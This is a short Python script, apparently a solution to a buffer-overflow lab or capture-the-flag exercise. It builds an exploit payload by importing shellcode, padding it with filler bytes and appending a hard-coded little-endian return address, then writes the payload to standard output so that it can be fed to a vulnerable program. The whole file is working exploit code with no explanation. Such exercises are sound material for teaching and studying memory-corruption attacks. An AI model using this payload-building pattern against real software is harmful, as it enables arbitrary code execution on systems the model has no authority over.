from shellcode import shellcode
import sys
if __name__ == '__main__':
    attack = shellcode
    attack += b"a" * (100 - len(shellcode))
    attack += b"a" * 12
    attack += 0xFFF6925C.to_bytes(4, "little")
    sys.stdout.buffer.write(attack)